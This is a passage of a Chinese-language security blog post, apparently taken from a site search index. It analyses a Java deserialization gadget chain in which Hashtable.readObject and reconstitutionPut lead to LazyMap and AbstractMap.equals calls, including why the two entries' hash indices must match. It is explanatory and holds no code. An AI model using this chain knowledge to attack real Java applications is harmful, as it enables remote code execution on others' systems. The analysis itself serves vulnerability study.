HashtablereconstitutionPut方法调用e.key.equals,参数可控 readObject入口处也直接调用了reconstitutionPut方法, 流程图 其实但看这流程图我觉得还是有一点昏的,我上面其实也有很多地方没有说清楚,比如为什么e.key可控,因为我觉得这些配合poc一起看得话可能更容易理解 流程分析 首先我们这里是put了两次,在进入reconstitutionPut方法前,会有一个for循环,这里我们的Key和Value是使用readObject得到的,那我们得先去看一下writeObject方法 writeObject中 很容易看出,这里传递的实际上就是HashTable#put时添加进去的key和value。 当我们第一次进入reconstitutionPut方法时,tab数组是没有值的,所以无法进入for循环调用equals方法,tab[index]的赋值是在for循环的后面 当我们第二次进入reconstitutionPut方法时 我们的e.key是第一次put的值,key是第二次put的值。 之前在看利用链时,我就在想,为什么这里能直接调用AbstractMap.equals(),为什么还要去先调用AbstractMapDecorator.equals()呢 于是自己做了一个测试,我把第一次put的值设置为hashMap,想直接调用AbstractMap.equals(new LazyMap()) 但是发现他第二次并没有如我们所愿进入for循环,原因时因为第一次传入hashMap时计算生成的index=0,而第二次传入lazyMap时生成的index=3,所以并不存在tab[3]。而两次put的都是lazymap的话,index计算出来都是等于3.这里看似e.key和key可控,但实际上还是有些限制的。","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"Java复现","slug":"Java复现","permalink":"https://pp1ove.gitee.io/tags/Java复现/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]}]}